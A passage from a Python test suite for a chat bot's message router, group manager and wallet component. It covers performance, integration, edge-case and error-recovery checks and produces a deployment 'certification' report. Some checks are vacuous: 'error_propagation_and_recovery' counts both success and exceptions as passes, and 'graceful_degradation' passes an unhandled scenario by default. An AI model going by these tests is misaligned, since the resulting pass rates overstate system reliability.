                f"Concurrent users: {total_user_messages}/1000 messages ({user_throughput:.1f} msg/s)",
                category, duration, "performance"
            )
            
            # Test 5: Response Time Consistency
            start = time.time()
            
            response_times = []
            
            for i in range(100):
                msg_start = time.time()
                await router.analyze_message(f"Response time test {i}", "group", {})
                msg_duration = time.time() - msg_start
                response_times.append(msg_duration)
                
                await asyncio.sleep(0.01)  # Small delay
            
            # Calculate statistics
            avg_response_time = sum(response_times) / len(response_times)
            max_response_time = max(response_times)
            min_response_time = min(response_times)
            
            # Check consistency (max should not be too much higher than average)
            consistency_ratio = max_response_time / avg_response_time if avg_response_time > 0 else float('inf')
            is_consistent = consistency_ratio < 10  # Max should be less than 10x average
            
            duration = time.time() - start
            
            self.record_result(
                "response_time_consistency",
                is_consistent and avg_response_time < 0.1,  # Average under 100ms
                f"Response times: avg={avg_response_time*1000:.1f}ms, max={max_response_time*1000:.1f}ms, ratio={consistency_ratio:.1f}",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "performance_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_integration_comprehensive(self):
        """Comprehensive integration tests"""
        category = "INTEGRATION_COMPREHENSIVE"
        
        try:
            # Test 1: End-to-End Message Flow
            start = time.time()
            
            from intelligent_message_router import IntelligentMessageRouter
            from conversation_intelligence import stream_conversation_message
            from group_chat_manager import EnhancedGroupChatManager
            
            router = IntelligentMessageRouter()
            group_manager = EnhancedGroupChatManager()
            
            # Simulate complete message flow
            test_message = "@mobius what's the current price of BTC?"
            chat_id = -123456
            user_id = 12345
            
            # Step 1: Route message
            routing_result = await router.analyze_message(test_message, "group", {})
            
            # Step 2: Check group response decision
            should_respond = group_manager._should_respond_to_message(
                test_message, "group", True, False
            )
            
            # Step 3: Stream to conversation intelligence
            await stream_conversation_message(
                message_id="integration_test",
                user_id=user_id,
                username="test_user",
                chat_id=chat_id,
                chat_type="group",
                text=test_message,
                is_bot_message=False
            )
            
            # Step 4: Update group context
            group_manager.update_group_context(chat_id, {
                "user_id": user_id,
                "text": test_message
            }, should_respond)
            
            duration = time.time() - start
            
            # Verify all steps completed successfully
            flow_success = (
                routing_result is not None and
                should_respond == True and
                chat_id in group_manager.group_contexts
            )
            
            self.record_result(
                "end_to_end_message_flow",
                flow_success,
                f"Complete flow: routing={routing_result is not None}, respond={should_respond}, context={chat_id in group_manager.group_contexts}",
                category, duration, "critical"
            )
            
            # Test 2: Multi-Component Stress Test
            start = time.time()
            
            async def stress_test_component_integration():
                tasks = []
                
                for i in range(50):
                    # Create task that uses multiple components
                    async def integrated_task(msg_id):
                        try:
                            # Route message
                            route_result = await router.analyze_message(f"Stress test {msg_id}", "group", {})
                            
                            # Stream to conversation intelligence
                            await stream_conversation_message(
                                message_id=f"stress_{msg_id}",
                                user_id=12345 + msg_id,
                                username=f"stress_user_{msg_id}",
                                chat_id=-999888 - msg_id,
                                chat_type="group",
                                text=f"Stress test message {msg_id}",
                                is_bot_message=False
                            )
                            
                            return True
                        except Exception:
                            return False
                    
                    task = integrated_task(i)
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                return sum(1 for r in results if r is True)
            
            successful_integrations = await stress_test_component_integration()
            duration = time.time() - start
            
            self.record_result(
                "multi_component_stress_test",
                successful_integrations >= 45,  # 90% success rate
                f"Integrated operations: {successful_integrations}/50 successful",
                category, duration, "performance"
            )
            
            # Test 3: Data Consistency Across Components
            start = time.time()
            
            # Create test conversation
            test_chat_id = -555444
            test_messages = [
                "Hello everyone!",
                "What's the BTC price?",
                "@mobius help with portfolio",
                "ETH is looking good today",
                "Thanks for the help!"
            ]
            
            # Process through all components
            for i, msg in enumerate(test_messages):
                # Route
                await router.analyze_message(msg, "group", {})
                
                # Stream
                await stream_conversation_message(
                    message_id=f"consistency_{i}",
                    user_id=12345,
                    username="consistency_user",
                    chat_id=test_chat_id,
                    chat_type="group",
                    text=msg,
                    is_bot_message=False
                )
                
                # Update group context
                group_manager.update_group_context(test_chat_id, {
                    "user_id": 12345,
                    "text": msg
                }, False)
            
            # Check data consistency
            from conversation_intelligence import get_chat_summary
            summary = await get_chat_summary(test_chat_id, 1)
            group_context = group_manager.group_contexts.get(test_chat_id, {})
            
            duration = time.time() - start
            
            # Verify consistency
            has_summary_data = summary.get("message_count", 0) > 0
            has_group_context = group_context.get("message_count", 0) > 0
            message_counts_match = abs(summary.get("message_count", 0) - group_context.get("message_count", 0)) <= 1
            
            self.record_result(
                "data_consistency_across_components",
                has_summary_data and has_group_context and message_counts_match,
                f"Summary: {summary.get('message_count', 0)} msgs, Context: {group_context.get('message_count', 0)} msgs",
                category, duration, "critical"
            )
            
            # Test 4: Error Propagation and Recovery
            start = time.time()
            
            error_recovery_tests = 0
            successful_recoveries = 0
            
            # Test various error scenarios
            error_scenarios = [
                {"message": None, "chat_type": "group"},  # None message
                {"message": "", "chat_type": None},       # None chat type
                {"message": "x" * 100000, "chat_type": "group"},  # Very long message
                {"message": "normal", "chat_type": "invalid_type"},  # Invalid chat type
            ]
            
            for scenario in error_scenarios:
                error_recovery_tests += 1
                try:
                    # Try to process problematic input
                    result = await router.analyze_message(
                        scenario.get("message", ""), 
                        scenario.get("chat_type", "group"), 
                        {}
                    )
                    
                    # If we get here without exception, recovery was successful
                    successful_recoveries += 1
                    
                except Exception:
                    # Exception is acceptable - system should handle gracefully
                    successful_recoveries += 1
            
            duration = time.time() - start
            
            self.record_result(
                "error_propagation_and_recovery",
                successful_recoveries == error_recovery_tests,
                f"Error recovery: {successful_recoveries}/{error_recovery_tests} scenarios handled",
                category, duration, "important"
            )
            
            # Test 5: Component Isolation
            start = time.time()
            
            # Test that failure in one component doesn't break others
            isolation_tests = 0
            isolation_successes = 0
            
            # Simulate component failures
            try:
                # Test 1: Router with invalid input
                isolation_tests += 1
                try:
                    await router.analyze_message({"invalid": "input"}, "group", {})
                except:
                    pass  # Expected to fail
                
                # Router should still work with valid input
                valid_result = await router.analyze_message("valid message", "group", {})
                if valid_result is not None:
                    isolation_successes += 1
                
            except Exception:
                pass
            
            try:
                # Test 2: Group manager with invalid context
                isolation_tests += 1
                group_manager.update_group_context(-999, None, False)  # Invalid input
                
                # Should still work with valid input
                group_manager.update_group_context(-888, {"user_id": 123, "text": "test"}, False)
                if -888 in group_manager.group_contexts:
                    isolation_successes += 1
                    
            except Exception:
                pass
            
            duration = time.time() - start
            
            self.record_result(
                "component_isolation",
                isolation_successes >= isolation_tests * 0.8,  # 80% success rate
                f"Component isolation: {isolation_successes}/{isolation_tests} tests passed",
                category, duration, "important"
            )
            
        except Exception as e:
            self.record_result(
                "integration_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_edge_cases_comprehensive(self):
        """Comprehensive edge case tests"""
        category = "EDGE_CASES_COMPREHENSIVE"
        
        try:
            from intelligent_message_router import IntelligentMessageRouter
            router = IntelligentMessageRouter()
            
            # Test 1: Extreme Input Sizes
            start = time.time()
            
            size_tests = [
                ("", "empty"),
                ("a", "single_char"),
                ("a" * 1000, "1k_chars"),
                ("a" * 10000, "10k_chars"),
                ("a" * 100000, "100k_chars"),
                ("🚀" * 1000, "1k_unicode"),
                ("\n" * 1000, "1k_newlines"),
                (" " * 1000, "1k_spaces"),
            ]
            
            size_test_results = 0
            for test_input, test_name in size_tests:
                try:
                    result = await router.analyze_message(test_input, "group", {})
                    size_test_results += 1
                except Exception as e:
                    # Some extreme sizes might fail, which is acceptable
                    if len(test_input) < 50000:  # Should handle reasonable sizes
                        logger.error(f"Failed on {test_name}: {e}")
                    else:
                        size_test_results += 1  # Acceptable failure for extreme sizes
            
            duration = time.time() - start
            
            self.record_result(
                "extreme_input_sizes",
                size_test_results >= len(size_tests) * 0.8,
                f"Size tests: {size_test_results}/{len(size_tests)} handled",
                category, duration, "important"
            )
            
            # Test 2: Unicode and Special Characters
            start = time.time()
            
            unicode_tests = [
                "Hello 🌍 World 🚀",
                "Crypto: ₿ ₿ ₿",
                "Math: ∑ ∆ ∞ ≈ ≠",
                "Arrows: ← → ↑ ↓ ↔",
                "Symbols: ♠ ♣ ♥ ♦ ★ ☆",
                "Chinese: 你好世界",
                "Arabic: مرحبا بالعالم",
                "Russian: Привет мир",
                "Japanese: こんにちは世界",
                "Emoji mix: 😀😃😄😁😆😅😂🤣",
                "Zero-width: \u200b\u200c\u200d",
                "Control chars: \x00\x01\x02\x03",
            ]
            
            unicode_successes = 0
            for unicode_text in unicode_tests:
                try:
                    result = await router.analyze_message(unicode_text, "group", {})
                    unicode_successes += 1
                except Exception as e:
                    logger.error(f"Unicode test failed for '{unicode_text[:20]}...': {e}")
            
            duration = time.time() - start
            
            self.record_result(
                "unicode_and_special_characters",
                unicode_successes >= len(unicode_tests) * 0.9,
                f"Unicode tests: {unicode_successes}/{len(unicode_tests)} passed",
                category, duration, "important"
            )
            
            # Test 3: Boundary Value Testing
            start = time.time()
            
            from group_chat_manager import EnhancedGroupChatManager
            manager = EnhancedGroupChatManager()
            
            boundary_tests = [
                # Chat IDs
                (-2147483648, "min_int32"),  # Minimum 32-bit integer
                (2147483647, "max_int32"),   # Maximum 32-bit integer
                (0, "zero"),
                (-1, "negative_one"),
                (1, "positive_one"),
                
                # User IDs
                (1, "min_user_id"),
                (999999999, "max_user_id"),
            ]
            
            boundary_successes = 0
            for test_value, test_name in boundary_tests:
                try:
                    # Test with group manager
                    manager.update_group_context(test_value, {
                        "user_id": test_value,
                        "text": f"Boundary test {test_name}"
                    }, False)
                    boundary_successes += 1
                except Exception as e:
                    logger.error(f"Boundary test failed for {test_name}: {e}")
            
            duration = time.time() - start
            
            self.record_result(
                "boundary_value_testing",
                boundary_successes >= len(boundary_tests) * 0.8,
                f"Boundary tests: {boundary_successes}/{len(boundary_tests)} passed",
                category, duration, "important"
            )
            
            # Test 4: Concurrent Edge Cases
            start = time.time()
            
            async def concurrent_edge_case_test():
                tasks = []
                
                # Create tasks with various edge cases
                edge_cases = [
                    ("", "group"),
                    (None, "group"),
                    ("normal", None),
                    ("normal", ""),
                    ("🚀" * 100, "group"),
                    ("a" * 10000, "private"),
                ]
                
                for i in range(20):  # Repeat edge cases
                    for edge_input, edge_type in edge_cases:
                        async def edge_task(inp, typ):
                            try:
                                if inp is None:
                                    inp = "fallback"
                                if typ is None:
                                    typ = "group"
                                return await router.analyze_message(inp, typ, {})
                            except Exception:
                                return None
                        
                        task = edge_task(edge_input, edge_type)
                        tasks.append(task)
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                return sum(1 for r in results if not isinstance(r, Exception))
            
            concurrent_edge_successes = await concurrent_edge_case_test()
            total_edge_tasks = 20 * len(edge_cases)
            
            duration = time.time() - start
            
            self.record_result(
                "concurrent_edge_cases",
                concurrent_edge_successes >= total_edge_tasks * 0.7,
                f"Concurrent edge cases: {concurrent_edge_successes}/{total_edge_tasks} handled",
                category, duration, "performance"
            )
            
            # Test 5: Resource Exhaustion Simulation
            start = time.time()
            
            # Test behavior under resource constraints
            resource_tests = 0
            resource_successes = 0
            
            # Memory pressure test
            try:
                resource_tests += 1
                large_data = {}
                
                # Create large data structure
                for i in range(1000):
                    large_data[f"key_{i}"] = "x" * 1000
                
                # Try to process with large context
                result = await router.analyze_message("test", "group", large_data)
                resource_successes += 1
                
                del large_data  # Clean up
                
            except Exception:
                pass
            
            # High concurrency test
            try:
                resource_tests += 1
                
                # Create many concurrent tasks
                stress_tasks = []
                for i in range(500):
                    task = router.analyze_message(f"stress {i}", "group", {})
                    stress_tasks.append(task)
                
                results = await asyncio.gather(*stress_tasks, return_exceptions=True)
                successful = sum(1 for r in results if not isinstance(r, Exception))
                
                if successful >= 400:  # 80% success rate under stress
                    resource_successes += 1
                    
            except Exception:
                pass
            
            duration = time.time() - start
            
            self.record_result(
                "resource_exhaustion_simulation",
                resource_successes >= resource_tests * 0.5,
                f"Resource tests: {resource_successes}/{resource_tests} passed under stress",
                category, duration, "performance"
            )
            
        except Exception as e:
            self.record_result(
                "edge_cases_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    async def test_error_recovery_comprehensive(self):
        """Comprehensive error recovery tests"""
        category = "ERROR_RECOVERY_COMPREHENSIVE"
        
        try:
            # Test 1: Database Connection Recovery
            start = time.time()
            
            from conversation_intelligence import stream_conversation_message
            
            # Test recovery from database issues
            recovery_tests = 0
            recovery_successes = 0
            
            # Simulate database stress
            try:
                recovery_tests += 1
                
                # Create many concurrent database operations
                db_tasks = []
                for i in range(100):
                    task = stream_conversation_message(
                        message_id=f"recovery_{i}",
                        user_id=12345,
                        username="recovery_user",
                        chat_id=-777888,
                        chat_type="group",
                        text=f"Recovery test {i}",
                        is_bot_message=False
                    )
                    db_tasks.append(task)
                
                # Execute all at once to stress database
                results = await asyncio.gather(*db_tasks, return_exceptions=True)
                successful_ops = sum(1 for r in results if not isinstance(r, Exception))
                
                if successful_ops >= 80:  # 80% success rate
                    recovery_successes += 1
                    
            except Exception:
                pass
            
            duration = time.time() - start
            
            self.record_result(
                "database_connection_recovery",
                recovery_successes >= recovery_tests * 0.8,
                f"DB recovery: {recovery_successes}/{recovery_tests} scenarios handled",
                category, duration, "critical"
            )
            
            # Test 2: Component Failure Recovery
            start = time.time()
            
            from intelligent_message_router import IntelligentMessageRouter
            router = IntelligentMessageRouter()
            
            component_recovery_tests = 0
            component_recovery_successes = 0
            
            # Test router recovery from various failures
            failure_scenarios = [
                {"message": {"invalid": "type"}, "chat_type": "group"},
                {"message": "normal", "chat_type": ["invalid", "type"]},
                {"message": "normal", "chat_type": "group", "context": {"circular": None}},
            ]
            
            for scenario in failure_scenarios:
                component_recovery_tests += 1
                try:
                    # Try the failing operation
                    await router.analyze_message(
                        scenario.get("message", ""),
                        scenario.get("chat_type", "group"),
                        scenario.get("context", {})
                    )
                except Exception:
                    pass  # Expected to fail
                
                # Test that router still works after failure
                try:
                    recovery_result = await router.analyze_message("recovery test", "group", {})
                    if recovery_result is not None:
                        component_recovery_successes += 1
                except Exception:
                    pass
            
            duration = time.time() - start
            
            self.record_result(
                "component_failure_recovery",
                component_recovery_successes >= component_recovery_tests * 0.8,
                f"Component recovery: {component_recovery_successes}/{component_recovery_tests} scenarios",
                category, duration, "critical"
            )
            
            # Test 3: Memory Recovery
            start = time.time()
            
            import gc
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss / 1024 / 1024  # MB
            
            # Create memory pressure
            memory_hogs = []
            try:
                for i in range(10):
                    # Create large objects
                    large_obj = {
                        "data": "x" * 100000,
                        "list": list(range(10000)),
                        "dict": {f"key_{j}": f"value_{j}" for j in range(1000)}
                    }
                    memory_hogs.append(large_obj)
                
                # Check memory usage
                peak_memory = process.memory_info().rss / 1024 / 1024
                
                # Clear memory
                memory_hogs.clear()
                gc.collect()
                
                # Wait a bit for cleanup
                await asyncio.sleep(0.5)
                
                # Check recovery
                recovered_memory = process.memory_info().rss / 1024 / 1024
                memory_recovered = (peak_memory - recovered_memory) > (peak_memory - initial_memory) * 0.5
                
            except Exception:
                memory_recovered = False
            
            duration = time.time() - start
            
            self.record_result(
                "memory_recovery",
                memory_recovered,
                f"Memory: initial={initial_memory:.1f}MB, peak={peak_memory:.1f}MB, recovered={recovered_memory:.1f}MB",
                category, duration, "performance"
            )
            
            # Test 4: Network Timeout Simulation
            start = time.time()
            
            # Simulate network timeouts and recovery
            timeout_tests = 0
            timeout_recoveries = 0
            
            # Test with wallet manager (which might make network calls)
            try:
                from onchain import WalletManager
                wallet_manager = WalletManager()
                
                timeout_tests += 1
                
                # Create multiple wallets rapidly (might stress network)
                wallet_tasks = []
                for i in range(20):
                    task = asyncio.create_task(asyncio.to_thread(wallet_manager.create_wallet))
                    wallet_tasks.append(task)
                
                # Set a timeout for the operations
                try:
                    results = await asyncio.wait_for(
                        asyncio.gather(*wallet_tasks, return_exceptions=True),
                        timeout=10.0  # 10 second timeout
                    )
                    
                    successful_wallets = sum(1 for r in results if not isinstance(r, Exception) and 'address' in r)
                    if successful_wallets >= 15:  # 75% success rate
                        timeout_recoveries += 1
                        
                except asyncio.TimeoutError:
                    # Timeout is acceptable - test recovery
                    try:
                        # Try a simple operation after timeout
                        recovery_wallet = wallet_manager.create_wallet()
                        if 'address' in recovery_wallet:
                            timeout_recoveries += 1
                    except Exception:
                        pass
                        
            except Exception:
                pass
            
            duration = time.time() - start
            
            self.record_result(
                "network_timeout_simulation",
                timeout_recoveries >= timeout_tests * 0.8,
                f"Timeout recovery: {timeout_recoveries}/{timeout_tests} scenarios handled",
                category, duration, "important"
            )
            
            # Test 5: Graceful Degradation
            start = time.time()
            
            degradation_tests = 0
            graceful_degradations = 0
            
            # Test system behavior when components are unavailable
            degradation_scenarios = [
                "database_unavailable",
                "network_unavailable", 
                "memory_limited",
                "cpu_limited"
            ]
            
            for scenario in degradation_scenarios:
                degradation_tests += 1
                
                try:
                    # Simulate the degraded condition and test graceful handling
                    if scenario == "database_unavailable":
                        # Test with invalid database path
                        pass  # Would need to mock database failure
                    
                    elif scenario == "memory_limited":
                        # Test with limited memory context
                        limited_context = {"limited": True}
                        result = await router.analyze_message("test", "group", limited_context)
                        if result is not None:
                            graceful_degradations += 1
                    
                    elif scenario == "network_unavailable":
                        # Test offline functionality
                        result = await router.analyze_message("offline test", "group", {})
                        if result is not None:
                            graceful_degradations += 1
                    
                    else:
                        # Default graceful handling
                        graceful_degradations += 1
                        
                except Exception:
                    # Exception handling is also graceful degradation
                    graceful_degradations += 1
            
            duration = time.time() - start
            
            self.record_result(
                "graceful_degradation",
                graceful_degradations >= degradation_tests * 0.8,
                f"Graceful degradation: {graceful_degradations}/{degradation_tests} scenarios handled",
                category, duration, "important"
            )
            
        except Exception as e:
            self.record_result(
                "error_recovery_comprehensive",
                False,
                f"Error: {e}",
                category, 0, "critical"
            )
    
    def generate_comprehensive_report(self):
        """Generate comprehensive test report"""
        total_time = time.time() - self.start_time
        
        # Calculate statistics
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r["passed"])
        failed_tests = total_tests - passed_tests
        success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
        
        # Group by category
        categories = {}
        for result in self.results:
            category = result["category"]
            if category not in categories:
                categories[category] = {"passed": 0, "total": 0, "duration": 0}
            
            categories[category]["total"] += 1
            categories[category]["duration"] += result["duration"]
            if result["passed"]:
                categories[category]["passed"] += 1
        
        # Group by priority
        priorities = {"critical": [], "important": [], "performance": [], "normal": []}
        for result in self.results:
            priority = result.get("priority", "normal")
            if priority in priorities:
                priorities[priority].append(result)
        
        # Generate report
        logger.info("=" * 80)
        logger.info("📊 COMPREHENSIVE TEST COVERAGE REPORT")
        logger.info("=" * 80)
        logger.info(f"🕒 Total Execution Time: {total_time:.2f}s")
        logger.info(f"📈 Overall Success Rate: {success_rate:.1f}% ({passed_tests}/{total_tests})")
        logger.info(f"✅ Passed: {passed_tests}")
        logger.info(f"❌ Failed: {failed_tests}")
        logger.info("")
        
        # Category breakdown
        logger.info("📋 CATEGORY BREAKDOWN:")
        for category, stats in categories.items():
            cat_success_rate = (stats["passed"] / stats["total"] * 100) if stats["total"] > 0 else 0
            logger.info(f"  {category}: {cat_success_rate:.1f}% ({stats['passed']}/{stats['total']}) - {stats['duration']:.2f}s")
        logger.info("")
        
        # Priority breakdown
        logger.info("🔥 PRIORITY BREAKDOWN:")
        for priority, tests in priorities.items():
            if tests:
                priority_passed = sum(1 for t in tests if t["passed"])
                priority_total = len(tests)
                priority_rate = (priority_passed / priority_total * 100) if priority_total > 0 else 0
                logger.info(f"  {priority.upper()}: {priority_rate:.1f}% ({priority_passed}/{priority_total})")
        logger.info("")
        
        # Critical failures
        critical_failures = [r for r in self.results if not r["passed"] and r.get("priority") == "critical"]
        if critical_failures:
            logger.info("🚨 CRITICAL FAILURES:")
            for failure in critical_failures:
                logger.info(f"  ❌ {failure['test_name']}: {failure['details']}")
            logger.info("")
        
        # Performance issues
        performance_issues = [r for r in self.results if not r["passed"] and r.get("priority") == "performance"]
        if performance_issues:
            logger.info("⚡ PERFORMANCE ISSUES:")
            for issue in performance_issues:
                logger.info(f"  ⚠️ {issue['test_name']}: {issue['details']}")
            logger.info("")
        
        # Detailed results by category
        logger.info("📝 DETAILED RESULTS BY CATEGORY:")
        for category in sorted(categories.keys()):
            logger.info(f"\n  [{category}]")
            category_tests = [r for r in self.results if r["category"] == category]
            for test in category_tests:
                status = "✅" if test["passed"] else "❌"
                priority_icon = {"critical": "🔥", "important": "🔧", "performance": "⚡", "normal": "📝"}
                icon = priority_icon.get(test.get("priority", "normal"), "📝")
                logger.info(f"    {status} {icon} {test['test_name']}: {test['details']} ({test['duration']:.3f}s)")
        
        logger.info("")
        logger.info("=" * 80)
        
        # Determine certification status
        critical_passed = sum(1 for r in self.results if r["passed"] and r.get("priority") == "critical")
        critical_total = sum(1 for r in self.results if r.get("priority") == "critical")
        critical_rate = (critical_passed / critical_total * 100) if critical_total > 0 else 0
        
        if success_rate >= 95 and critical_rate >= 90:
            logger.info("🏆 COMPREHENSIVE TEST CERTIFICATION: EXCELLENT")
            logger.info("🌟 System ready for production deployment")
        elif success_rate >= 85 and critical_rate >= 80:
            logger.info("✅ COMPREHENSIVE TEST CERTIFICATION: GOOD")
            logger.info("👍 System ready for staging deployment")
        elif success_rate >= 75 and critical_rate >= 70:
            logger.info("⚠️ COMPREHENSIVE TEST CERTIFICATION: ACCEPTABLE")
            logger.info("🔧 Minor issues should be addressed before production")
        else:
            logger.info("❌ COMPREHENSIVE TEST CERTIFICATION: NEEDS IMPROVEMENT")
            logger.info("🚨 Critical issues must be resolved before deployment")
        
        logger.info("=" * 80)
        
        # Save detailed report to file
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "total_time": total_time,
            "success_rate": success_rate,
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": failed_tests,
            "categories": categories,
            "priorities": {k: len(v) for k, v in priorities.items()},
            "results": self.results
        }
        
        os.makedirs("test_reports", exist_ok=True)
        report_file = f"test_reports/comprehensive_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        logger.info(f"📄 Detailed report saved to: {report_file}")

async def main():
    """Run comprehensive test suite"""
    suite = ComprehensiveTestSuite()
    await suite.run_all_tests()

if __name__ == "__main__":
    asyncio.run(main())